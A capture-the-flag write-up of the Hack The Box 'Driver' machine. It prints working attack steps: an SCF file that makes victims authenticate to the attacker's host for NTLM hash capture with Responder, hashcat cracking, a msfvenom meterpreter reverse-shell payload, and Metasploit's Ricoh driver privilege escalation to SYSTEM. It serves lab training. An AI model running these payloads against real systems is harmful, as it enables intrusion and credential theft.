*Windows* - Driver is an easy Windows machine that focuses on printer exploitation. Enumeration of the machine reveals that a web server is listening on port 80, along with SMB on port 445 and WinRM on port 5985. Navigation to the website reveals that it&amp;amp;amp;#039;s protected using basic HTTP authentication. While trying common credentials the `admin:admin` credential is accepted and we are able to visit the webpage. The webpage provides a feature to upload printer firmwares on an SMB share for a remote team to test and verify. Uploading a Shell Command File that contains a command to fetch a remote file from our local machine, leads to the NTLM hash of the user `tony` relayed back to us. Cracking the captured hash to retrieve a plaintext password we are able login as `tony`, using WinRM. Then, switching over to a meterpreter session it is discovered that the machine is vulnerable to a local privilege exploit that abuses a specific printer driver that is present on the remote machine. Using the exploit we can get a session as `NT AUTHORITY\SYSTEM`.

--------------

## Task 1

**We're prompted for log on credentials when accessing the target over HTTP. What username is disclosed when looking at the HTTP response headers?**

When visiting the page it prompts for an authentication.

I just provide some `test:test` to observe the request and response via Burp.

The response discloses the username:

```http
HTTP/1.1 401 Unauthorized
Content-Type: text/html; charset=UTF-8
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/7.3.25
WWW-Authenticate: Basic realm="MFP Firmware Update Center. Please enter password for admin"
Date: Wed, 02 Apr 2025 03:55:05 GMT
Content-Length: 20


Invalid Credentials
```

So the disclosed username is `admin`.

--------------

## Task 2

**Weak passwords are all too common and this target is no exception. What is the password for this target's login?**

When there is a username `admin` we should always try a password `admin`.

And this works.

------------

## Task 3

**There are several kinds of files that are commonly dropped into a file share to target other users who may browse to the share. If the user browses to the share, their host will try to authenticate to the attacker. What is the file extension that can be uploaded here to trigger that connection?**

When we `nmap` the target, the result shows a number of open ports:

```sh
nmap -sV -sC 10.10.11.106
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-01 22:59 CEST
Stats: 0:01:01 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.82% done; ETC: 23:00 (0:00:00 remaining)
Nmap scan report for 10.10.11.106
Host is up (0.034s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
135/tcp  open  msrpc        Microsoft Windows RPC
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 7h01m10s, deviation: 0s, median: 7h01m10s
| smb2-time: 
|   date: 2025-04-02T04:00:53
|_  start_date: 2025-04-02T03:52:37
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.56 seconds
```

After some search on google about the smb upload file attacks, we see that one of the extensions used is `.scf`.

-----------

## Task 4

**We've intercepted an Net-NTLMv2 hash with Responder. What is the mode in Hashcat required to crack this hash format?**

Let's first create a `.scf` file, which will when opened, will try to connect to my machine, into which I will start `responder` to listen, and then capture the NTLM hash.

SCF file:
```scf
[Shell]
Command=2
IconFile=\\10.10.14.33\attack.RedPlis
[Taskbar]
Command=ToggleDesktop
```

Then start  the `responder`:
```sh
sudo responder -I tun0
```

After I upload the `.scf` and I got the information such as client, username, and the hash.

```sh
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.11.106
[SMB] NTLMv2-SSP Username : DRIVER\tony
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:6406c8ef116e1f9b:3A69A93B230549735BD6661E8DB7FB9F:010100000000000080E4E4F25BA3DB016B23B75DAF1B2B250000000002000800390043005100580001001E00570049004E002D00580052004E0051004A0046004300410057005300330004003400570049004E002D00580052004E0051004A004600430041005700530033002E0039004300510058002E004C004F00430041004C000300140039004300510058002E004C004F00430041004C000500140039004300510058002E004C004F00430041004C000700080080E4E4F25BA3DB0106000400020000000800300030000000000000000000000000200000C354626AD29E7424DE47C5449E38343CC9BD2B43634676321B9BAD29D57ACC7C0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0033003300000000000000000000000000
[*] Skipping previously captured hash for DRIVER\tony
```

I save this hash to a file, and run `hachat` into it to identify the hash, and show the mode which should be used.

```sh
5600 | NetNTLMv2 | Network Protocol
```

----------------

## Task 5

**What is the tony user's password?**

Now, let's try to crack it using the `rockyou` wordlist.

```sh
hashcat -m 5600 tony_hash --wordlist /home/hb/Documents/tools/rockyou.txt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 203 MB

Dictionary cache hit:
* Filename..: /home/hb/Documents/tools/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

TONY::DRIVER:6406c8ef116e1f9b:3a69a93b230549735bd6661e8db7fb9f:010100000000000080e4e4f25ba3db016b23b75daf1b2b250000000002000800390043005100580001001e00570049004e002d00580052004e0051004a0046004300410057005300330004003400570049004e002d00580052004e0051004a004600430041005700530033002e0039004300510058002e004c004f00430041004c000300140039004300510058002e004c004f00430041004c000500140039004300510058002e004c004f00430041004c000700080080e4e4f25ba3db0106000400020000000800300030000000000000000000000000200000c354626ad29e7424de47c5449e38343cc9bd2b43634676321b9bad29d57acc7c0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0033003300000000000000000000000000:liltony
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
```

And we have the credentials which are `tony:liltony`.

-----------

## Task 6

**Submit the flag located on the tony user's desktop.**

Let's use the `netexec` tool to connect and check if the credentials work, by using port `5985` which is `WinRM` - `Windows Remote Management`.

```sh
netexec winrm 10.10.11.106 -u tony -p liltony
WINRM       10.10.11.106    5985   DRIVER           [*] Windows 10 Build 10240 (name:DRIVER) (domain:DRIVER)
WINRM       10.10.11.106    5985   DRIVER           [+] DRIVER\tony:liltony (Pwn3d!)
```

Now, I will use `evil-winrm` tool to connect and access the system.

```sh
evil-winrm -i 10.10.11.106 -u tony -p liltony

/usr/share/evil-winrm/vendor/bundle/ruby/3.3.0/gems/winrm-2.3.9/lib/winrm.rb:15: warning: syslog was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 3.4.0.
You can add syslog to your Gemfile or gemspec to silence this warning.
/usr/share/evil-winrm/vendor/bundle/ruby/3.3.0/gems/winrm-fs-1.3.5/lib/winrm-fs.rb:22: warning: csv was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 3.4.0.
You can add csv to your Gemfile or gemspec to silence this warning.
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\tony\Documents> 
```

Navigate to the desktop and read the flag:

```sh
*Evil-WinRM* PS C:\Users\tony\Desktop> cat user.txt
7e42fb252a52f092594758ddcb421d9b
```

----------

## Task 7

**What is the filename that stores the command history for PowerShell for tony?**

We can get the location and information about this file with the following command.

```ps
*Evil-WinRM* PS C:\> Get-ChildItem -Path "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine"


    Directory: C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/28/2021  12:06 PM            134 ConsoleHost_history.txt
```

So the name is `ConsoleHost_history.txt`.

------------

## Task 8

**Looking at the Powershell history we can see some actions being performed with a specific printer type. Research of this should show that it's exploitable for privilege escalation and a module is available for the Metasploit framework. What is the module name?**


After reading the file, we see the action that was performed is:

```sh
Add-Printer -PrinterName "RICOH_PCL6" -DriverName 'RICOH PCL6 UniversalDriver V4.23' -PortName 'lpt1:'
```

After some search on internet we see that there is a `Local Privilege Escalation` vulnerability CVE-2019-19363.

And there is a module on metasploit named `ricoh_driver_privesc`.

------------

## Task 9

**Initial attempts to exploit this vulnerability may fail under specific logon types such as non-interactive, but in this scenario we can switch to an interactive logon. What command can be used in Metasploit to switch to an interactive logon process?**

Let's create a malicious payload to put on the target machine, that gives us meterpreter.

```sh
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.33 LPORT=4444 -f exe > meterpreter.exe
```

Then using `WinRM` upload the payload to the target using `upload` command.

Now, we need to start a listening service on `Metasploit`.

```sh
use exploit/multi/handler
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost tun0
lhost => tun0
msf6 exploit(multi/handler) > set lport 4444
lport => 4444
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.33:4444 
```

And now run the payload on the target machine.

```ps
.\meterpreter.exe
```

And on `Metasploit` we see that now we are inside `meterpreter`.

```sh
[*] Sending stage (203846 bytes) to 10.10.11.106
[*] Meterpreter session 1 opened (10.10.14.33:4444 -> 10.10.11.106:49429) at 2025-04-02 00:34:06 +0200

meterpreter > 
```

After using `help` which shows all the commands available on meterpreter, the command `migrate` can be used to switch to an interactive logon process.

------------

## Task 10

**In addtion to the 'RICOH PCL6 UniversalDriver V4.23' vulnerabiltiy, this target is also vulnerable to CVE-2021-1675 aka PrintNightmare. Is it possible to elevate to SYSTEM privileges with this CVE?**

Yes, since with this vulnerability a new user with administrative privileges can be created.

--------------

## Task 11

**Submit the flag located on the administrator's desktop.**

If we list processes with `ps` we see that `meterpreter.exe` is running on `session 0` meaning that we are on non-interactive isolated service session.

Now let's migrate it into a process for example `explorer.exe` by using `migrate`:

```sh
migrate -N explorer.exe
```

Let's put the current session into the background with `background` command.

```sh
meterpreter > background
[*] Backgrounding session 2...
```

Now let's use the `ricoh` vulnerability.

```sh
use exploit/windows/local/ricoh_driver_privesc 
```

On the payload settings put the session the same as our `meterpreter` session.

```sh
set SESSION 2
```

Also set the `LHOST` to the IP address and `LPORT` to for example 4444, and run it.

```sh
msf6 exploit(windows/local/ricoh_driver_privesc) > run
[*] Started reverse TCP handler on 10.10.14.33:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Sending stage (177734 bytes) to 10.10.11.106
[+] The target appears to be vulnerable. Ricoh driver directory has full permissions
[-] Exploit aborted due to failure: bad-config: The payload should use the same architecture as the target driver
[*] Deleting printer 
[*] Meterpreter session 3 opened (10.10.14.33:4444 -> 10.10.11.106:49431) at 2025-04-02 01:15:48 +0200
[*] Exploit completed, but no session was created.
```

We can see that we have a new session 3, so let's go to that with `sessions 3`.

And we are on `meterpreter` 

Now navigate to `C:/users/administrator/desktop` and there is a file `root.txt` which contains the flag: `f2d51a44d206f5f59d0f8968b5606cbf`.




